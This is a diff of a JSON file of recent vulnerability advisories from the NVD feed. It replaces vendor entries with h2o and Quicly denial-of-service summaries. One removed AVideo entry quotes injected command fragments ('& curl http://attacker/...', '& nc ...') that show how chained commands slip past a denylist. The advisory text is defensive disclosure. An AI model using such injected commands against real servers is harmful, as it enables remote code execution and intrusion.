@@ -1,48 +1,48 @@
 {
-  "generated_at": "2026-07-16T22:15:13+00:00",
+  "generated_at": "2026-07-17T00:10:29+00:00",
   "source": "https://services.nvd.nist.gov/rest/json/cves/2.0",
   "items": [
     {
-      "id": "CVE-2026-61378",
-      "summary": "A divide-by-zero vulnerability in the Productivity Suite allows a local \nattacker to cause a division by zero leading to a system crash.",
-      "published": "2026-07-16T21:17:21.950",
-      "cvss": 5.5,
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-61378"
+      "id": "CVE-2026-44453",
+      "summary": "h2o is an HTTP server with support for HTTP/1.x, HTTP/2 and HTTP/3. Prior to commit 6b5370d, h2o is vulnerable to a Denial of Service attack when calling alloca under certain conditions. When serving static files, h2o builds the file path on stack, by calling alloca. The maximum size of the memory allocated using alloca can be as huge as ~600KB, which exceeds the default pthread stack size used by musl libc (128KB). If the amount of memory allocated by alloca exceeds the stack size, the h2o server crashes with a segmentation fault, while it tries to touch the guard page. This issue has been fixed by commit 6b5370d.",
+      "published": "2026-07-16T23:16:17.423",
+      "cvss": 7.5,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44453"
     },
     {
-      "id": "CVE-2026-60073",
-      "summary": "An out-of-bounds read in the Productivity Suite allows a physical \nattacker to control the length of data sent to a USB device. This can \nlead to a system crash or disclosure of kernel memory.",
-      "published": "2026-07-16T21:17:21.773",
+      "id": "CVE-2026-44452",
+      "summary": "h2o is an HTTP server with support for HTTP/1.x, HTTP/2 and HTTP/3. Prior to commit 8dc37cb, when h2o receives a ClientHello message over TLS or QUIC and it contains a zero-length SNI extension, the h2o server runs over the zero-length hostname while trying to copy the hostname, assuming that it is NULL-terminated. This is a potential denial-of-service attack vector in sense that it might trigger segmentation violation. This issue has been fixed by commit 8dc37cb.",
+      "published": "2026-07-16T23:16:17.280",
       "cvss": 5.9,
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-60073"
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44452"
     },
     {
-      "id": "CVE-2026-57896",
-      "summary": "An out-of-bounds read vulnerability in the Productivity Suite allows a \nlocal attacker to trigger kernel memory corruption by sending a crafted \nIOCTL request. This could lead to limited information disclosure or \ndisruption of the affected product.",
-      "published": "2026-07-16T21:17:21.617",
-      "cvss": 6.1,
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-57896"
+      "id": "CVE-2026-44436",
+      "summary": "Quicly is an IETF QUIC protocol implementation intended primarily for use within the H2O HTTP server. Prior to commit 8b178e6, Quicly is vulnerable to a Denial of Service attack through connection state corruption. In QUIC Invariants, the maximum length of a Connection ID is 255 bytes, while QUIC version 1 further restricts the maximum to 20 bytes. Quicly implements QUIC version 1 and therefore its CID buffers are limited to 20 bytes. However, to be able to respond to unknown versions of QUIC, its packet decoder accepts Connection IDs of up to 255 bytes. As its CID buffers are merely 20 bytes long, Quicly must reject QUIC version 1 packets with Connection IDs longer than that. The command line tool bundled with Quicly has had that check, however the library itself lacked such enforcement. As a consequence, when used by applications that lack their own enforcement, the connection state becoming inconsistent to buffer overrun. Fortunately, the overflow stops within the allocated chunk of memory, but nevertheless, the bug leads to assertion failures. This issue has been fixed by commit 8b178e6.",
+      "published": "2026-07-16T23:16:17.143",
+      "cvss": 7.5,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44436"
     },
     {
-      "id": "CVE-2026-55173",
-      "summary": "WWBN AVideo is an open source video platform. Versions 29.0 and below remain vulnerable to OS command injection because the fix for CVE-2026-33482 was incomplete and still does not neutralize a single & (\u00a0the shell background operator). CVE-2026-33482 reported that sanitizeFFmpegCommand() (plugin/API/standAlone/functions.php) failed to strip $(...) command substitution, allowing OS command injection at the execAsync() sh -c sink. The fix (commit 25c8ab90) added $, (, ), {, }, \\n, \\r to the denylist character class and a str_replace('&&', '', ...), but did not account for the single &. ffmpeg.json.php builds the command from _decryptString(getInput('codeToExecEncrypted')). This is the same threat model the original advisory accepted (\u201can attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server\u201d) and the same CVSS basis (AV:N/AC:H/PR:N). Multiple &-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the > strip, but command execution (e.g. & curl http://attacker/..., & nc ..., dropping/running a file) is not. This issue has been patched by this commit: https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f.",
-      "published": "2026-07-16T21:17:21.483",
-      "cvss": 8.1,
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55173"
+      "id": "CVE-2026-44435",
+      "summary": "Quicly is an IETF QUIC protocol implementation intended primarily for use within the H2O HTTP server. Prior to commit 937d0e9, an assertion failure is raised when the total number of valid handshake messages received over a CRYPTO stream of a single packet number space exceeds 32KB, causing a Denial of Service. This issue has been fixed by commit 937d0e9.",
+      "published": "2026-07-16T23:16:17.010",
+      "cvss": 7.5,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44435"
     },
     {
-      "id": "CVE-2026-53410",
-      "summary": "A time-of-check to time-of-use (TOCTOU) race condition in the installation and uninstallation process of certain Zoom Clients for Windows could allow an authenticated local user to escalate privileges.",
-      "published": "2026-07-16T21:17:21.377",
-      "cvss": 7.0,
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-53410"
+      "id": "CVE-2026-44434",
+      "summary": "Quicly is an IETF QUIC protocol implementation intended primarily for use within the H2O HTTP server. Prior to commit dccf5d4, Quicly was vulnerable to stateless reset injection through lack of packet entry validation. The QUIC protocol is designed to withstand packet injection attacks, once the handshake is complete. Only packets that carry some secret patterns are considered as stateless resets. Quicly allows the peer to share up to 4 such patterns per connection. However, until now, it failed to determine which of the 4 slots that it uses to retain the secret patterns contains a valid entry. As the slots are zero-initialized, the failure meant that, unless the peer advertised 4 of such patterns, an all-zero pattern was treated as a stateless reset.In effect, this allowed an on-path attacker to reset QUIC connections governed by Quicly. This issue has been fixed by commit dccf5d4.",
+      "published": "2026-07-16T23:16:16.870",
+      "cvss": 5.3,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44434"
     },
     {
-      "id": "CVE-2026-53409",
-      "summary": "Improper Privilege Management in Zoom Rooms for Windows before version 7.1.0 may allow an authenticated user to conduct an escalation of privilege via local access.",
-      "published": "2026-07-16T21:17:21.253",
-      "cvss": 7.8,
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-53409"
+      "id": "CVE-2026-44433",
+      "summary": "Quicly is an IETF QUIC protocol implementation intended primarily for use within the H2O HTTP server. Prior to commit 8b178e6, an adversarial peer could send a STREAM frame carrying just one byte at the largest offset being permitted to obtain additional flow control credit, which under certain circumstances could lead to a Denial of Service. Assuming the application prepares a receive buffer for storing all data that arrive out-of-order, up to the largest offset being received, this behavior could lead to the application allocating large amount of memory with the peer sending only a handful of packets, resulting in memory exhaustion. In addition to the receive buffer allocation strategy, the severity of this vulnerability depends on how the application controls the stream concurrency. In case of the H2O HTTP server, under its default setting, this bug increases the maximum amount of memory allocated per connection by about 4 times. This issue has been fixed by commit 8b178e6.",
+      "published": "2026-07-16T23:16:16.727",
+      "cvss": 5.3,
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44433"
     }
   ]
 }
